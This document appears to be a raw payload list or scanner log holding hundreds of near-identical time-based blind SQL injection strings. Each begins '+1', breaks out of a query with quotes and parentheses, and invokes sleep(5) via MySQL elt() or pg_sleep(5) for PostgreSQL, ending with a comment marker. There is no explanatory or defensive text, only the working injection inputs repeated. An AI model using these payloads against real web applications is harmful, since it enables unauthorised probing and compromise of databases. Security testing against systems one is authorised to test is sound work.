+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
